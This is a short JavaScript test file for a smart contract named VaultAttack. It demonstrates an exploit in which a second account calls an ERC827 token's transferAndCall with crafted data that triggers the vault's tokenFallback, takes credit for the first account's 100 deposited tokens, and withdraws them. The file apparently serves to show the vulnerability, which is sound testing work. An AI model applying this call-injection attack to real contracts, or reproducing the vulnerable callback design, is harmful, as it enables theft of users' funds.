
var ERC827TokenMock = artifacts.require('ERC827TokenMock');
var VaultAttack = artifacts.require('VaultAttack');

var BigNumber = web3.BigNumber;
require('chai')
  .use(require('chai-as-promised'))
  .use(require('chai-bignumber')(BigNumber))
  .should();

contract('VaultAttack', function (accounts) {
  let token, vault;

  beforeEach(async function () {
    token = await ERC827TokenMock.new(accounts[0], 100);
    vault = await VaultAttack.new();
  });

  it('should take all the tokens in the Vault contract', async function () {
    await token.approve(vault.address, 100);
    await vault.deposit(token.address, 100);

    assert.equal(await vault.getBalance(token.address, accounts[0]), 100);

    const attackData = vault.contract.tokenFallback.getData(accounts[1], 100, 0x0);
    await token.transferAndCall(vault.address, 0, attackData, {from: accounts[1]});

    assert.equal(await vault.getBalance(token.address, accounts[1]), 100);

    await vault.withdraw(token.address, 100, {from: accounts[1]});

    assert.equal(await token.balanceOf(accounts[1]), 100);
    assert.equal(await token.balanceOf(accounts[0]), 0);
  });

});
